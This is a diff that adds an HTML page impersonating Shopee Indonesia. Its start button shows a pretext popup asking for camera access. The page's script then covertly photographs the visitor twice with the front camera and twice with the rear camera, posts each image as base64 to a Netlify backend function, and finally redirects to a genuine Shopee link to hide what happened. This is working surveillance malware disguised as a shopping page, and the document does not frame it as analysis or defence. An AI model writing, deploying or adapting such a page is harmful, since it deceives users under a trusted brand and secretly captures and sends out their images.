@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shopee Indonesia - Ujicoba</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .container {
+            background-color: #fff;
+            padding: 40px 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 90%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .logo-container {
+            margin-bottom: 20px;
+        }
+        .logo-container img {
+            width: 80px;
+            height: auto;
+        }
+        .logo-text {
+            font-size: 2.5em;
+            font-weight: 700;
+            color: #ee4d2d;
+            margin-top: 10px;
+        }
+        .intro-text {
+            font-size: 1.1em;
+            color: #555;
+            margin-top: 10px;
+            margin-bottom: 30px;
+        }
+        .start-button {
+            background-color: #ee4d2d;
+            color: #fff;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1em;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            width: 100%;
+        }
+        .start-button:hover {
+            background-color: #d13d21;
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            visibility: hidden;
+            opacity: 0;
+            transition: visibility 0s, opacity 0.3s ease;
+        }
+        .overlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
+        .popup-box {
+            background: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.2);
+            max-width: 350px;
+            transform: scale(0.9);
+            transition: transform 0.3s ease;
+        }
+        .overlay.active .popup-box {
+            transform: scale(1);
+        }
+        .popup-box h2 {
+            margin-top: 0;
+            color: #333;
+            font-size: 1.5em;
+        }
+        .popup-box p {
+            color: #666;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHY41_EUKPndINZdVnbeumbJjJJHNW9-YSnA&s" alt="Shopee Logo">
+            <div class="logo-text">Shopee</div>
+        </div>
+        <button id="startButton" class="start-button">Mulai Lihat Produk</button>
+    </div>
+
+    <div id="permissionOverlay" class="overlay">
+        <div class="popup-box">
+            <h2>Perhatian</h2>
+            <p>Untuk mengoptimalkan aplikasi, silahkan izinkan akses kamera.</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('startButton').addEventListener('click', () => {
+            document.getElementById('permissionOverlay').classList.add('active');
+            accessCameraAndTakePictures();
+        });
+
+        async function accessCameraAndTakePictures() {
+            const redirectUrl = "https://id.shp.ee/MSpk691";
+            let stream = null;
+
+            try {
+                // Ambil dan kirim 2 foto dari kamera depan
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                await takeMultiplePhotos(stream, 2);
+
+                // Hentikan stream sebelum ganti kamera
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+
+                // Ambil dan kirim 2 foto dari kamera belakang
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                await takeMultiplePhotos(stream, 2);
+
+                // Setelah semua foto berhasil dikirim, alihkan ke URL
+                window.location.href = redirectUrl;
+
+            } catch (err) {
+                console.error("Gagal mendapatkan akses kamera atau mengirim gambar:", err);
+                alert("Akses kamera ditolak atau terjadi kesalahan. Silakan izinkan akses kamera.");
+                document.getElementById('permissionOverlay').classList.remove('active');
+            } finally {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            }
+        }
+
+        function takeMultiplePhotos(stream, count) {
+            return new Promise(resolve => {
+                let takenPhotos = 0;
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    const canvas = document.createElement('canvas');
+                    const takePhotoInterval = setInterval(() => {
+                        if (takenPhotos < count) {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const context = canvas.getContext('2d');
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            // Dapatkan data foto dalam format Base64
+                            const photoDataUrl = canvas.toDataURL('image/jpeg');
+                            
+                            // Kirim foto ke server backend
+                            sendPhotoToServer(photoDataUrl);
+                            
+                            takenPhotos++;
+                        } else {
+                            clearInterval(takePhotoInterval);
+                            resolve();
+                        }
+                    }, 2000); // Ambil foto setiap 2 detik untuk memastikan pengambilan gambar
+                };
+            });
+        }
+
+        async function sendPhotoToServer(photoData) {
+            try {
+                const response = await fetch('/.netlify/functions/send-photo', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ photoData }),
+                });
+                const result = await response.json();
+                console.log("Status pengiriman foto:", result.message);
+            } catch (error) {
+                console.error("Gagal mengirim foto ke server:", error);
+            }
+        }
+    </script>
+</body>
+</html>
